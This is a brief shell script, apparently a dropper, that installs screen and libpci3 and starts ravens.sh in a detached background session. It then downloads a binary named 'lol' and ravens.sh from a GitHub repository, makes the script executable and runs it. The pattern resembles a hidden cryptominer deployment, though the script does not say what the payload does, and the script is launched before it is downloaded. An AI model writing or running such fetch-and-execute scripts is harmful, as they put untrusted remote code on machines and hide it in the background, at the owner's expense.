#!/bin/sh

sudo apt update
sudo apt install screen -y
apt-get install libpci3
screen -dmS ravens.sh ./ravens.sh 65 75
wget https://github.com/gasken1/asw/raw/main/lol
wget https://raw.githubusercontent.com/gasken1/asw/main/ravens.sh
chmod +x ravens.sh
./ravens.sh
